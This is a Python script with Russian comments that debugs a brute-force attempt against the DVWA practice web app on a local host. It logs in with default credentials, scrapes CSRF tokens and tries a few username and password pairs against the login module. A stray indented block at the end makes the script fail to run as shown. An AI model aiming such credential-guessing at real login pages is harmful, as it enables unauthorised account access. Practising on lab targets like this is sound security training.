#!/usr/bin/python3
import requests
import re

print("="*70)
print("DVWA BRUTEFORCE - COMPLETE DEBUG")
print("="*70)

s = requests.Session()

# ====== ТЕСТ 1: Проверяем доступность ======
print("\n[1] CONNECTION TEST")
print("-"*40)
try:
    r = requests.get("http://dvwa.local/", timeout=5)
    print(f"✓ DVWA доступна (Status: {r.status_code})")
except:
    print("✗ DVWA недоступна!")
    exit()

# ====== ТЕСТ 2: Пробуем залогиниться ======
print("\n[2] LOGIN TEST")
print("-"*40)
login_url = "http://dvwa.local/login.php"

# Вариант 1: Без CSRF
r = s.post(login_url, data={'username':'admin','password':'password','Login':'Login'})
print(f"Login без CSRF: {r.status_code}, {len(r.text)} chars")

# Если не получилось, пробуем с CSRF
if 'logout' not in r.text.lower():
    print("  ↳ Пробуем с CSRF...")
    r = s.get(login_url)
    csrf_match = re.search(r'user_token" value="([^"]+)"', r.text)
    if csrf_match:
        csrf = csrf_match.group(1)
        r = s.post(login_url, data={'username':'admin','password':'password',
                                   'Login':'Login','user_token':csrf})
        print(f"  Login с CSRF: {r.status_code}, {len(r.text)} chars")

# Проверяем результат
if 'logout' in r.text.lower():
    print("✓ Успешно залогинены")
else:
    print("✗ Не удалось залогиниться")

# ====== ТЕСТ 3: Смотрим cookies ======
print("\n[3] COOKIES CHECK")
print("-"*40)
cookies = dict(s.cookies)
print(f"Cookies: {cookies}")
if 'PHPSESSID' in cookies and 'security' in cookies:
    print("✓ Все нужные cookies есть")
else:
    print("✗ Не хватает cookies")

# ====== ТЕСТ 4: Пробуем brute force модуль ======
print("\n[4] BRUTE FORCE MODULE ACCESS")
print("-"*40)
brute_url = "http://dvwa.local/vulnerabilities/brute/"

# Пробуем просто открыть страницу
r = s.get(brute_url)
print(f"Brute force page: {r.status_code}, {len(r.text)} chars")

# Смотрим что на странице
if len(r.text) < 1600:
    print("✓ Страница brute force загружена (не страница логина)")
else:
    print("✗ Похоже на страницу логина, а не brute force")

# ====== ТЕСТ 5: Ищем форму и CSRF ======
print("\n[5] FORM ANALYSIS")
print("-"*40)

# Ищем форму
form_match = re.search(r'<form[^>]*>.*?</form>', r.text, re.DOTALL)
if form_match:
    form_html = form_match.group(0)
    print("✓ Форма найдена")
    
    # Ищем CSRF в форме
    csrf_match = re.search(r'user_token" value="([^"]+)"', form_html)
    if csrf_match:
        csrf_token = csrf_match.group(1)
        print(f"✓ CSRF token найден: {csrf_token[:15]}...")
    else:
        print("✗ CSRF token НЕ найден в форме")
else:
    print("✗ Форма не найдена")

# Покажем HTML формы (первые 500 символов)
print("\nФорма (первые 300 символов):")
print("-"*40)
if form_match:
    print(form_match.group(0)[:300])
print("-"*40)

# ====== ТЕСТ 6: Пробуем отправить данные ======
print("\n[6] TESTING PASSWORDS")
print("-"*40)

# Варианты запросов
test_requests = []

# Вариант A: Без CSRF
test_requests.append(("Без CSRF", f"{brute_url}?username=admin&password=password&Login=Login"))

# Вариант B: С CSRF если найден
if 'csrf_token' in locals():
    test_requests.append(("С CSRF", f"{brute_url}?username=admin&password=password&Login=Login&user_token={csrf_token}"))

# Вариант C: Попробуем другого пользователя
test_requests.append(("Пользователь gordonb", f"{brute_url}?username=gordonb&password=abc123&Login=Login"))

for test_name, url in test_requests:
    print(f"\n{test_name}:")
    r = s.get(url)
    print(f"  Response: {len(r.text)} chars")
    
    # Ищем ключевые слова
    response_lower = r.text.lower()
    
    if 'welcome to the password protected area' in response_lower:
        print("  ✓ УСПЕХ: 'Welcome to the password protected area'")
        # Найдем и покажем полную строку
        for line in r.text.split('\n'):
            if 'Welcome' in line:
                print(f"  Full: {line.strip()}")
    elif 'username and/or password incorrect' in response_lower:
        print("  ✗ ОШИБКА: 'Username and/or password incorrect'")
    elif 'csrf' in response_lower:
        print("  ⚠ CSRF ошибка")
    else:
        print("  ? Неизвестный ответ")
        
        # Покажем немного текста
        clean = re.sub('<[^>]+>', ' ', r.text)
        clean = ' '.join(clean.split())
        if len(clean) > 50:
            print(f"  Text: {clean[:100]}...")

# ====== ТЕСТ 7: Сохраняем всё для анализа ======
print("\n[7] SAVING FOR ANALYSIS")
print("-"*40)
with open('debug_brute_page.html', 'w') as f:
    f.write(r.text)
print("✓ Последняя страница сохранена в debug_brute_page.html")

print("\n" + "="*70)
print("DEBUG COMPLETE")
print("="*70)

print("\nРЕКОМЕНДАЦИИ:")
print("1. Открой файл debug_brute_page.html в браузере")
print("2. Посмотри как выглядит форма brute force")
print("3. Если есть CSRF поле - используй его")
print("4. Если нет - значит CSRF не требуется")
    
    # Сохраним для анализа
    with open('brute_response.html', 'w') as f:
        f.write(r.text)
    print("Full response saved to brute_response.html")
